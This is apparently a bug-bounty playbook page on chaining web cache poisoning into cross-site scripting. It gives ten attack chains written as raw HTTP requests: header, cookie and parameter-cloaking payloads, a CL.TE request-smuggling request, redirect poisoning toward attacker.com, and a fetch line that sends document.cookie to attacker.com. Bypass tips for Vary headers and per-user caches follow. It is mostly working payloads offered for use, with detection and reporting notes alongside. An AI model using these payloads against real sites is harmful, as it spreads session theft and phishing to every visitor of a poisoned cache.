---
tags:
  - critical
---

# Cache Poisoning → XSS

From cache manipulation to stored cross-site scripting affecting all users.

## Overview

```
Cache Poisoning → Unkeyed Header → Reflected in Response → Cached → XSS to All Users
               → Request Smuggling → Poison Cache → XSS
               → CSPT + Deception → Store Malicious Content → XSS
```

---

## Concepts

### Cache Keys

Cache identifies requests by **key** (typically: Host + Path + Query).
**Unkeyed inputs** affect response but aren't in key → exploitable.

### Impact Difference

| Normal XSS | Cache Poisoned XSS |
|------------|-------------------|
| Affects 1 victim | Affects ALL users |
| Requires victim click | Persists in cache |
| Self-XSS → useless | Self-XSS → critical |

---

## Chain 1: Unkeyed Header → Cached XSS

**Technique:** Header reflected in response but not in cache key

### Detection

```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: test-injection

# Check if "test-injection" appears in response
# AND cache serves same response without header
```

### Exploit

```http
GET /en?cb=random123 HTTP/1.1
Host: target.com
X-Forwarded-Host: "><script>alert(1)</script>

# Response contains XSS payload
# Cached for /en path
# All users loading /en get XSS
```

### Common Unkeyed Headers

```
X-Forwarded-Host
X-Forwarded-Scheme
X-Host
X-Original-URL
X-Rewrite-URL
X-Forwarded-Prefix
```

---

## Chain 2: JavaScript Include Poisoning

**Technique:** Response includes script from header value

### Detection

```html
<!-- Response contains -->
<script src="//X-Forwarded-Host/static/app.js"></script>
```

### Exploit

```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Cached response:
<script src="//attacker.com/static/app.js"></script>

# All users load attacker's JavaScript
```

### Attacker Server

```javascript
// attacker.com/static/app.js
fetch('https://attacker.com/steal?c=' + document.cookie);
```

---

## Chain 3: Redirect Poisoning → Phishing/XSS

**Technique:** Poison redirect to attacker domain

### Exploit

```http
GET /login HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http

# Cached redirect:
HTTP/1.1 301 Moved Permanently
Location: https://attacker.com/login

# All /login requests → attacker phishing page
```

---

## Chain 4: Request Smuggling → Cache Poison → XSS

**Technique:** Smuggle request to poison cache with XSS payload

### CL.TE Smuggling

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 124
Transfer-Encoding: chunked

0

GET /static/app.js HTTP/1.1
Host: target.com
Content-Length: 50

<script>alert(document.cookie)</script>
```

### Result

```
Cache stores XSS payload at /static/app.js
All users loading that script → XSS
```

---

## Chain 5: CSPT + Cache Deception → Stored XSS

**Technique:** Client-Side Path Traversal tricks cache into storing malicious content

### Vulnerable Pattern

```javascript
// SPA fetches data based on user input
fetch(`/api/users/${userId}/profile`)

// Attacker injects path traversal
userId = '../../../evil.html'
// Fetches: /api/evil.html
```

### Exploit Chain

```
1. Find CSPT in SPA
2. Inject: ../../../api/inject?html=<script>alert(1)</script>
3. Cache stores response at seemingly static path
4. Other users load cached malicious content
```

---

## Chain 6: Cookie Poisoning → Cached XSS

**Technique:** Cookie value reflected and cached

### Vulnerable Pattern

```http
GET / HTTP/1.1
Host: target.com
Cookie: lang=en

# Response:
<html lang="en">
```

### Exploit

```http
GET / HTTP/1.1
Host: target.com
Cookie: lang=en"><script>alert(1)</script>

# Cached response contains XSS
# Served to all users regardless of their cookies
```

---

## Chain 7: Fat GET → Cache Poison

**Technique:** GET request with body, cache uses URL, backend uses body

### Exploit

```http
GET /api/data?report=safe HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=<script>alert(1)</script>

# Cache key: /api/data?report=safe
# Backend uses body: report=<script>alert(1)</script>
# Cached response contains XSS
```

---

## Chain 8: Parameter Cloaking → Cache Poison

**Technique:** Different parameter parsing between cache and backend

### Ruby Semicolon Parsing

```http
GET /page?safe=1;evil=<script>alert(1)</script> HTTP/1.1

# Cache sees: one parameter "safe=1;evil=..."
# Ruby sees: safe=1 AND evil=<script>...
# evil reflected in response, cached under safe key
```

### URL Delimiter Confusion

```http
GET /page;param=<script>alert(1)</script> HTTP/1.1

# Spring matrix params: /page with param
# Cache: /page;param=... (different handling)
```

---

## Chain 9: DoS Escalation → Persistent XSS

**Technique:** Poison cache with error page containing XSS

### Exploit

```http
GET /page HTTP/1.1
Host: target.com
X-Malformed-Header: <script>alert(1)</script>

# Server returns 400 error with header reflected
# Error page cached
# All users get XSS error page
```

---

## Chain 10: Static Extension Abuse

**Technique:** Add static extension to dynamic endpoint, CDN caches

### Exploit

```http
# Normally not cached
GET /api/search?q=<script>alert(1)</script>

# Add .js extension, CDN caches as static
GET /api/search.js?q=<script>alert(1)</script>

# Cached with XSS payload
```

---

## Detection Tools

```bash
# Param Miner (Burp)
# - Finds unkeyed headers/params

# Manual detection
# Look for:
# - X-Cache: HIT
# - CF-Cache-Status: HIT
# - Age: [seconds]
```

---

## Cache Buster for Testing

```
# Add unique param to ensure fresh cache
GET /page?cachebust=random123 HTTP/1.1

# Test, then remove cachebust to verify persistence
GET /page HTTP/1.1
```

---

## Real Examples

### ChatGPT ATO (Cache Deception)

```
Path: /share/%2F..%2Fapi/auth/session
CDN cached anything under /share/
Path traversal reached auth endpoint
Session tokens cached → ATO
```

### HackerOne Global Redirect Poisoning

```
X-Forwarded-Host reflected in redirects
Single request poisoned entire site
```

---

## Impact Template

```
Cache poisoning enables persistent XSS affecting all users:

1. Unkeyed [header/parameter] is reflected in response
2. Malicious payload cached at [path]
3. All users loading [path] execute attacker's JavaScript
4. Can steal sessions, credentials, perform actions as any user

Severity: Critical (persistent, affects all users)
CVSS: 9.1+ (Network/Low/None/Changed/High/High)
```

---

## Quick Checklist

- [ ] Identify caching (X-Cache, CF-Cache-Status, Age headers)
- [ ] Find unkeyed inputs (Param Miner)
- [ ] Test header reflection (X-Forwarded-Host, etc.)
- [ ] Test cookie reflection
- [ ] Test path normalization differences
- [ ] Test static extension abuse
- [ ] Test parameter delimiter confusion
- [ ] Verify persistence after cache buster removal

---

## Bypasses

### Vary Header

```http
# If Vary: User-Agent
# Must match victim's User-Agent to poison their cache

GET /page HTTP/1.1
User-Agent: [victim's exact user-agent]
X-Evil-Header: <script>alert(1)</script>
```

### Per-User Cache

```
# Some caches are per-user (cookies in key)
# Find endpoints with shared cache
# Or poison before victim authenticates
```

---
*Related: [XSS to ATO](xss-to-ato.md) | [SSRF to RCE](ssrf-to-rce.md)*
